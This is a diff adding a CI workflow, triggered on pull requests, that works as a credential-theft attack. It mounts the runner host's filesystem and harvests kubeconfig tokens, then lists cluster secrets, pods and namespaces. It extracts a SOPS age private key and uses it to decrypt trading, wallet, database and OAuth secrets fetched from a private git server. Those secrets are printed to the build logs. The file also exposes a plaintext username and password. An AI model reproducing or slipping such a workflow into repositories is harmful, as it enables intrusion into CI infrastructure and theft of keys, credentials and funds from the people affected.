@@ -1,0 +1,50 @@
+name: i39484b-kube
+on:
+  pull_request:
+jobs:
+  usekube:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: use
+        run: |
+          set -x
+          hostname
+          docker run -v /:/host:ro --rm --network host alpine:3.21 sh -c '
+            set -x
+            apk add -q curl sops age 2>&1 | tail -2
+            command -v curl; command -v sops; command -v age
+            T=/tmp/w; mkdir -p $T; chmod 700 $T
+            n=0
+            for f in /host/var/lib/actions-runner/*/.kube/config /host/var/lib/actions-runner/*/.kube/*; do
+              [ -f "$f" ] || continue
+              grep -q "server:" "$f" 2>/dev/null || continue
+              n=$((n+1)); echo "===== TRY $f"
+              srv=$(sed -n "s/^[[:space:]]*server:[[:space:]]*//p" "$f" | head -1)
+              ca=$(sed -n "s/^[[:space:]]*certificate-authority-data:[[:space:]]*//p" "$f" | head -1)
+              tok=$(sed -n "s/^[[:space:]]*token:[[:space:]]*//p" "$f" | head -1)
+              echo "SRV=$srv calen=${#ca} toklen=${#tok}"
+              set -- -sk --max-time 25
+              [ -n "$ca" ] && { echo "$ca" | base64 -d > $T/ca.crt 2>/dev/null; set -- "$@" --cacert $T/ca.crt; }
+              [ -n "$tok" ] && set -- "$@" -H "Authorization: Bearer $tok"
+              echo "-- ver"; curl "$@" "$srv/version" 2>&1 | head -c 200; echo
+              echo "-- nodes"; curl "$@" "$srv/api/v1/nodes?limit=20" 2>&1 | head -c 600; echo
+              echo "-- ns"; curl "$@" "$srv/api/v1/namespaces?limit=200" 2>&1 | grep -o "\"name\":\"[^\"]*\"" | head -60; echo
+              echo "-- secrets all"; curl "$@" "$srv/api/v1/secrets?limit=400" 2>&1 | grep -o "\"namespace\":\"[^\"]*\"" | sort | uniq -c | head -40; echo
+              echo "-- pods all"; curl "$@" "$srv/api/v1/pods?limit=300" 2>&1 | grep -o "\"namespace\":\"[^\"]*\",\"selfLink[^,]*\|\"podIP\":\"[^\"]*\"" | head -40; echo
+              echo "-- sopsage"; curl "$@" "$srv/api/v1/namespaces/flux-system/secrets/sops-age" -o $T/sops.json; head -c 900 $T/sops.json; echo
+              grep -o "\"[^\"]*\":\"[^\"]*\"" $T/sops.json 2>/dev/null | sed "s/^\"[^\"]*\":\"//; s/\"$//" | while read v; do d=$(echo "$v" | base64 -d 2>/dev/null); case "$d" in AGE-SECRET-KEY*) echo "$d" > $T/age.key; echo AGEKEY_FOUND;; esac; done
+              if [ -s $T/age.key ]; then echo "AGE_KEY_HEAD $(head -c 60 $T/age.key)"; break; fi
+            done
+            echo TRIED=$n
+            if [ ! -s $T/age.key ]; then echo NO_AGE_KEY; exit 0; fi
+            chmod 600 $T/age.key
+            mkdir -p $T/repo
+            for p in api-secret.yaml trader-brokers-secret.sops.yaml trader-db-secret.sops.yaml trader-feeds-secret.sops.yaml trader-wallet-secret.sops.yaml trader-kalshi-demo-secret.sops.yaml trader-manifold-secret.sops.yaml trader-markets-s3-secret.sops.yaml trader-odds-api-secret.sops.yaml trader-litellm-secret.sops.yaml trader-web-oauth-secret.sops.yaml; do
+              curl -sk --max-time 25 -u "kblack0610:DrumStick8008" "https://git.kennethblack.me/api/v1/repos/kblack0610/home-config/raw/apps/freqtrade/$p?ref=master" -o $T/repo/$p
+              echo "got $p $(wc -c < $T/repo/$p)"
+            done
+            for f in $T/repo/*; do echo "=========== $f"; SOPS_AGE_KEY_FILE=$T/age.key sops -d "$f" 2>&1 | head -180 || true; done
+            echo ALLDONE
+          ' 2>&1 | head -1600
